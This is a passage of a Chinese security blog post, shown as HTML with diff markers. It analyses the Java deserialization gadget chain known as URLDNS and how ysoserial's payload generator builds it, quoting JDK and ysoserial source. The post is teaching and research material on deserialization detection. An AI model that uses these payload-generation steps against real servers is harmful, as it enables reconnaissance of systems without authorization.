tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里一直向下跟进直到<code>36</code>行的一个<code>for</code>循环发现这里有<code>readObject</code>方法，我们传入的<code>key</code>又是<code>java.net.URL</code>对象，继续向下走然后到<code>41</code>行的的<code>putVal</code>方法，再继续跟进<code>hash</code>方法。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637599470741-be8e664a-8981-4bdd-948a-70dee5cbd45d.png"
+                      alt="image.png"
+                ></p>
+<ul>
+<li><p>跟进<code>hash</code>方法后，因为<code>key</code>不为空，发现里面的<code>hashCode</code>方法，那么继续跟进。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>这里是<code>java.net.URL</code>对象，因此跟进到<code>URL.java</code>的898行，当时的<code>hashCode</code>值为<code>-1</code>，因此进入下面的<code>handler</code>的<code>hashCode</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>handler</code>又是<code>URLStreamHandler</code>的对象，于是乎跟进<code>URLStreamHandler</code>的第<code>350</code>行，这里的参数<code>u</code>则是我们刚才传递的<code>URL</code>对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String host = u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        String file = u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        String ref = u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>第<code>10</code>行获取<code>host</code>和<code>port</code>跟进。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p><code>InetAddress.getByName</code>则进行一次DNS请求获取，到这里差不多也就结束了。</p>
+</li>
+<li><p><code>gadGet Chain</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap-&gt;readObject()</span><br><span class="line">HashMap-&gt;hash()</span><br><span class="line">URL-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress()</span><br><span class="line">InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637604714252-6c93522b-3c5c-4279-84f9-dba7a880bbbe.png"
+                      alt="image.png"
+                ></p>
+<h1 id="Ysoseria分析"><a href="#Ysoseria分析" class="headerlink" title="Ysoseria分析"></a>Ysoseria分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2></li>
+<li><p>直接用<code>IDEA</code>打开我们克隆下来的项目，由于我有两个<code>Java</code>版本自动把项目配置为<code>JDK14</code>了，因此需要更改JDK版本，打开<code>File</code>-&gt;<code>Project Structure</code>。</p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637631264137-fc22cf53-cd07-4a75-8cbf-0ed0c66d422d.png"
+                      alt="image.png"
+                ></p>
+<ul>
+<li>有<code>pom.xml</code>得知我们的主类文件是<code>GeneratePayload.java</code>，运行查看环境是否成功。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637631463634-77a11b4b-fef7-4ba1-98dd-4d188a225073.png"
+                      alt="image.png"
+                ></p>
+<ul>
+<li>由于他是命令行获取的参数，因此我们配置当前文件运行参数，或者自己注释获取参数的<code>17-20</code>代码，直接给出传递的参数值，这里就采用配置参数的形式。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637632435999-7c434e22-b000-4bad-80d3-8dc70fc187da.png"
+                      alt="image.png"
+                ></p>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><ul>
+<li><p>这里断点直接放到第<code>9</code>行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">		printUsage();</span><br><span class="line">		System.exit(USAGE_CODE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">final</span> String payloadType = args[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">final</span> String command = args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line">	<span class="keyword">if</span> (payloadClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">		System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">		printUsage();</span><br><span class="line">		System.exit(USAGE_CODE);</span><br><span class="line">		<span class="keyword">return</span>; <span class="comment">// make null analysis happy</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line">		<span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">		PrintStream out = System.out;</span><br><span class="line">		Serializer.serialize(object, out);</span><br><span class="line">		ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">		System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		System.exit(INTERNAL_ERROR_CODE);</span><br><span class="line">	&#125;</span><br><span class="line">	System.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>来到<code>Utils.getPayloadClass</code>，这里是<code>payloadType</code>则是我们第攻击模块，这里传递的是<code>URLDNS</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;? extends ObjectPayload&gt; getPayloadClass ( <span class="keyword">final</span> String className ) &#123;</span><br><span class="line">     Class&lt;? extends ObjectPayload&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         clazz = (Class&lt;? extends ObjectPayload&gt;) Class.forName(className);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> ( Exception e1 ) &#123;&#125;</span><br><span class="line">     <span class="keyword">if</span> ( clazz == <span class="keyword">null</span> ) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> clazz = (Class&lt;? extends ObjectPayload&gt;) Class</span><br><span class="line">                     .forName(GeneratePayload.class.getPackage().getName() + <span class="string">&quot;.payloads.&quot;</span> + className);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">catch</span> ( Exception e2 ) &#123;&#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> ( clazz != <span class="keyword">null</span> &amp;&amp; !ObjectPayload.class.isAssignableFrom(clazz) ) &#123;</span><br><span class="line">         clazz = <span class="keyword">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> clazz;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>这里就是利用反射来获取我们需要的类，因为是<code>forName</code>因此需要全限定类名，然后返回获取的类，因为可以获取到<code>URLDNS</code>类<code>payloadClass</code>则不为空，进入<code>try</code>代码块。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line">			<span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">			PrintStream out = System.out;</span><br><span class="line">			Serializer.serialize(object, out);</span><br><span class="line">			ObjectPayload.Utils.releasePayload(payload, object);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>将<code>URLDNS</code>类通过反序列化的方式进行初始化，然后进入<code>getObject</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">        HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>这里又实例化了<code>SilentURLStreamHandler()</code>，继续向下跟进。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>这里继承了<code>URLStreamHandler</code>，重写了下面两个方法，其中让<code>getHostAddress</code>为空，因此不会触发<code>InetAddress.getByName</code>从而没有<code>DNS</code>请求，对比哈原生<code>URLStreamHandler</code>类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>接下来就是基础的通过反射使<code>URL</code>对象的<code>hashCode</code>值为<code>-1</code>，然后返回对象。再调用<code>Serializer.serialize(object, out)</code>对我们的<code>hashMap</code>对象进行序列化操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">	<span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">	objOut.writeObject(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>这里就正常序列化然后调用输出流，<code>ObjectPayload.Utils.releasePayload</code>则是判断<code>URLDNS</code>是否为<code>ReleaseableObjectPayload</code>的一个子类，这个类是是一个接口，定义了一个<code>release</code>方法，然后就结束了，退出程序。</p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2021/png/23035803/1637635846885-c03b62ef-c8d8-47b1-8f43-5cdc5d16f1e4.png"
+                      alt="image.png"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：URLDNS分析</li>
+        <li>Post author：Pan3a</li>
+        <li>Create time：2021-11-23 10:51:00</li>
+        <li>
+            Post link：https://pan3a.github.io/2021/11/23/URLDNS/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Pan3a</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">Java反序列化基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ysoserial"><span class="nav-number">2.</span> <span class="nav-text">Ysoserial</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E6%88%90payload"><span class="nav-number">2.1.</span> <span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">编写漏洞代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URLDNS"><span class="nav-number">3.</span> <span class="nav-text">URLDNS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ysoseria%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">Ysoseria分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">4.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">调试分析</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
